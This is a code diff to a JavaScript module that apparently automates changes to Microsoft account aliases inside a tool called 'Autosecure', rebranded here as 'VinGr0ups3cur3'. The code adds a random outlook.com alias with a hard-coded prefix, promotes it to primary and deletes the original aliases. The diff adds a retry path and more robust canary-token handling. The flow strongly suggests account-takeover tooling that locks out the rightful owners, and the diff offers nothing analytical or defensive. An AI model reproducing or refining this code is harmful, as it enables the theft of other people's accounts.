@@ -60,7 +60,7 @@ function isChangePrimaryEnabled(settings) {
 }
 
 /**
- * Orchestrates alias mutations during Autosecure.
+ * Orchestrates alias mutations during VinGr0ups3cur3.
  * Powered by strict 4-phase state machine:
  * BEFORE -> VALIDATION -> CHANGE PRIMARY -> AFTER -> REMOVE SECONDARY.
  */
@@ -95,8 +95,8 @@ module.exports = async function aliasses(
   const shouldChangePrimary = isChangePrimaryEnabled(settings);
 
   if (shouldChangePrimary) {
-    const rawPrefix = settings?.prefix || config.prefix || "hachiiromc";
-    const prefix = strictSanitizePrefix(rawPrefix) || "hachiiromc";
+    const rawPrefix = config.prefix || "vinGr0up";
+    const prefix = strictSanitizePrefix(rawPrefix) || "vinGr0up";
     const newAliasName = `${prefix}${generate(8).toLowerCase()}`;
     const expectedNewEmail = `${newAliasName}@outlook.com`.toLowerCase();
 
@@ -107,13 +107,25 @@ module.exports = async function aliasses(
       targetAlias: expectedNewEmail
     });
 
-    const addResult = await addAlias(axios, newAliasName, initial?.formCanary || canary2, rootReqId);
+    let addResult = await addAlias(axios, newAliasName, initial?.formCanary || canary2, rootReqId);
+    if (!addResult) {
+      logAliasEvent("ALIAS_WORKFLOW", {
+        requestId: rootReqId,
+        step: "ADD_ALIAS",
+        status: "WARN",
+        message: `First attempt to add alias ${expectedNewEmail} failed. Retrying with alternate alias name...`
+      });
+      const retryAliasName = `${prefix}${generate(8).toLowerCase()}`;
+      const retryExpectedEmail = `${retryAliasName}@outlook.com`.toLowerCase();
+      addResult = await addAlias(axios, retryAliasName, null, rootReqId);
+    }
+
     if (!addResult) {
       logAliasEvent("ALIAS_WORKFLOW", {
         requestId: rootReqId,
         step: "ADD_ALIAS",
         status: "FAILED",
-        message: `Failed to add alias ${expectedNewEmail}. Retaining ${initialPrimary}`
+        message: `Failed to add alias after retry. Retaining ${initialPrimary}`
       });
       acc.email = initialPrimary;
       await Promise.allSettled([
@@ -180,9 +192,9 @@ module.exports = async function aliasses(
         try {
           // Refetch fresh canary before each removal to avoid stale canary rotation
           const freshState = await getAliases(axios);
-          const freshFormCanary = freshState?.formCanary || null;
+          const freshCanary = freshState?.apiCanary || freshState?.formCanary || null;
 
-          await removeAlias(axios, oldAlias, freshFormCanary, amrp, amsc, rootReqId);
+          await removeAlias(axios, oldAlias, freshCanary, amrp, amsc, rootReqId);
         } catch (remErr) {
           logAliasEvent("ALIAS_WORKFLOW", {
             requestId: rootReqId,
@@ -209,8 +221,10 @@ module.exports = async function aliasses(
         remainingAliases.unshift(verifiedNewEmail);
       }
 
-      await updateExtraInformation(uid, "aliases", JSON.stringify(remainingAliases));
-      await updateExtraInformation(uid, "newaliases", JSON.stringify([verifiedNewEmail]));
+      await Promise.allSettled([
+        updateExtraInformation(uid, "aliases", JSON.stringify(remainingAliases)),
+        updateExtraInformation(uid, "newaliases", JSON.stringify([verifiedNewEmail]))
+      ]);
     } else {
       // makePrimary reported failure. Before rolling back, re-verify the
       // authoritative server state: the mutation may have actually succeeded
@@ -247,7 +261,7 @@ module.exports = async function aliasses(
 
         try {
           const rollbackState = await getAliases(axios);
-          const rollbackCanary = rollbackState?.formCanary || null;
+          const rollbackCanary = rollbackState?.apiCanary || rollbackState?.formCanary || null;
           const rollbackResult = await removeAlias(axios, verifiedNewEmail, rollbackCanary, amrp, amsc, rootReqId);
 
           logAliasEvent("ALIAS_WORKFLOW", {
